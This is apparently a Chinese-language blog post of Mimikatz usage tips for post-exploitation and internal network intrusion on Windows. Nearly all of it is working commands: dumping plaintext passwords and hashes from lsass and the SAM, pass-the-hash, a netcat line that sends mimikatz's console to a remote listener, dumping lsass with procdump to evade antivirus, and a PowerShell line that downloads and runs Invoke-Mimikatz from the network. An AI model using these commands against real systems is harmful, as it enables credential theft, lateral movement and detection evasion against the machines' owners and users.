---
title: Mimikatz使用Tips
date: 2015-12-15
tags:
- Mimikatz
- 内网渗透
---
[Mimikatz](/file/downloads/mimikatz_trunk.zip)是一款能够从Windows认证进程(lsass.exe)里获取处于active状态账号明文密码的工具。在针对Windows操作系统的后渗透测试中经常用到。
<!-- more -->
# 基本使用
## 本地执行并输出结果
```
C:\>mimikatz.exe ""privilege::debug"" ""log sekurlsa::logonpasswords full"" exit && dir
```
## 将输出输入到文件
将结果输出到log.txt文件中，这种输出结果便于查看
```
C:\>mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit >> log.txt
```
# 内网渗透
## 使用nc远程执行
本地监听任意端口
```
C:\>nc.exe -lvp 1234
```
远端使用nc执行
```
C:\>nc.exe -vv you_ip 1234 -e mimikatz.exe
```
## Hash传递
```
Privilege::debug
sekurlsa::pth /domain:xxxx /user:xxxxx /ntlm:xxxxxx
```
## 导出所有用户口令
```
lsadump::sam SYSTEM.hiv SAM.hiv
```
# 其他技巧
## 配合procdump绕过杀软
实际测试中mimikatz通常会被杀软查杀，配合procdump可以抓取内存后本地解密。ProcDump是微软的一款工具，其主要目的是监视CPU峰值的应用程序，但同时它也可以用于进程转储。
[下载地址](/file/downloads/Procdump.zip)
工具使用：
```
C:\>procdump.exe -accepteula -ma lsass.exe passwd.dmp
```
进程保存好后下载到本地，这里要注意本地运行mimikatz的系统要与目标机器的系统兼容，兼容性如下：
![](/file/images/minidump_matrix.png)
准备好环境后就可以用mimikatz抓取密码了
```
mimikatz # sekurlsa::minidump passwd.dmp
Switch to MINIDUMP
mimikatz # sekurlsa::logonPasswords full
```
## 使用Powershell抓取密码
Powershell 是运行在windows机器上实现系统和应用程序管理自动化的命令行脚本环境，支持.NET对象。白名单、可以轻松绕过杀软。
```
powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
```
